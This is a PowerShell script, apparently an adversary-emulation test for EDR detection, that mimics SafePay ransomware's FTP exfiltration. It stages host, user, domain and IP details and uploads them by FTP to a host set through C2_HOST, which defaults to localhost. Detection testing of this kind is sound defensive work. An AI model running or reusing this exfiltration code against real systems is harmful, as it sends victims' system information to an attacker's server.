<#
.SYNOPSIS
    SafePay FTP Exfiltration - DETECTION TRIGGER
.DESCRIPTION
    Exfiltrates data via FTP protocol.
    TTP: T1048
#>
$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting SafePay FTP Exfiltration (T1048)" -ForegroundColor Cyan

# Step 1: Collect data
Write-Host "`n[*] [T1005] Collecting data for exfiltration..."
$stagingDir = "C:\temp\safepay_staging"
if (-not (Test-Path $stagingDir)) { New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null }

$exfilData = @"
=== SAFEPAY EXFIL DATA ===
Hostname: $(hostname)
User: $(whoami)
Domain: $($env:USERDOMAIN)
IP: $(ipconfig | Select-String "IPv4" | Out-String)
"@
$dataFile = "$stagingDir\exfil_data.txt"
$exfilData | Out-File $dataFile -Encoding ASCII
Write-Host "    [+] Data collected: $dataFile" -ForegroundColor Green

# Step 2: Create FTP script file
Write-Host "`n[*] [T1048] Creating FTP exfiltration script..."
$ftpScript = @"
open $C2Host
anonymous
anonymous@test.lab
binary
put $dataFile exfil_upload.txt
quit
"@
$ftpScriptPath = "$stagingDir\ftp_script.txt"
$ftpScript | Out-File $ftpScriptPath -Encoding ASCII
Write-Host "    [+] FTP script: $ftpScriptPath" -ForegroundColor Green

# Step 3: Execute FTP exfiltration
Write-Host "`n[*] [T1048] Executing FTP exfiltration..."
Write-Host "    CMD: ftp -s:$ftpScriptPath"
ftp -s:$ftpScriptPath 2>&1 | ForEach-Object { Write-Host "    $_" }

# Step 4: Alternative - PowerShell FTP upload
Write-Host "`n[*] [T1048] Attempting PowerShell FTP upload..."
Write-Host "    CMD: [System.Net.FtpWebRequest]::Create ftp://$C2Host/upload"
try {
    $ftpUrl = "ftp://$C2Host/exfil_upload.txt"
    $req = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $req.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $req.Credentials = [System.Net.NetworkCredential]::new("anonymous", "test@test.lab")
    $req.Timeout = 5000
    
    $fileContent = [System.IO.File]::ReadAllBytes($dataFile)
    $stream = $req.GetRequestStream()
    $stream.Write($fileContent, 0, $fileContent.Length)
    $stream.Close()
    
    Write-Host "    [+] FTP upload completed" -ForegroundColor Green
} catch {
    Write-Host "    [-] FTP upload failed (expected without server): $_" -ForegroundColor Gray
}

Write-Host "`n[+] FTP Exfiltration Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: FTP execution, data staging, FTP script file creation" -ForegroundColor Magenta
